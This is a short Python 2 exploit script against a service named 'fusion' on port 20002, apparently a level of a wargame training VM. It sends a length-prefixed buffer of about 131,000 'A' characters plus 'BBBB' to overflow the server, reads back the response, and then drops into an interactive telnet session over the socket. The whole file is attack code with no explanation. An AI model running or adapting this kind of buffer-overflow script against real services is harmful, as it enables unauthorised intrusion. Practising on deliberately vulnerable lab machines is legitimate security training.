import socket
import struct 
import time
import telnetlib
 
T = "fusion"
P = 20002
key_sz = 32*4
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((T,P))
 
payl = "A"*131088 #junk
payl += 'B' * 4
 
payl_size = len(payl)
print "[*] Sending exploit"
s.send("E")
s.send(struct.pack("I", payl_size))
s.send(payl)
time.sleep(0.5)
s.recv(120) # message from srv
sz = s.recv(4)
sz = struct.unpack("I", sz)[0]
buff = s.recv(sz)
 
s.send("Q")
 
print "[+] Done... enjoy!"
t = telnetlib.Telnet()
t.sock = s
t.interact()
